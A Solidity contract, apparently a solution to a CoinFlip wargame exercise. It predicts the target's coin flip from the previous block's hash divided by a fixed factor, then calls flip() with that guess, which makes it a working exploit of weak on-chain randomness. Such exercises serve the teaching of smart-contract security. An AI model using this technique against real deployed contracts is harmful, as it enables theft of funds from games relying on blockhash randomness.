// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";
import "hardhat/console.sol";

contract AttackingCoinFlip {
    address public contractAddress;
    CoinFlip coinflip;
    bool public side;
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external  {
        // Code me!
        coinflip = CoinFlip(contractAddress);
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 cf = blockValue / FACTOR;
         side = cf == 1 ? true : false;
         console.log(side);
        (bool success,) = contractAddress.call(abi.encodeWithSignature("flip(bool)",side));
        require(success);
        //  contractAddress.call.flip(side);
        

    }
}
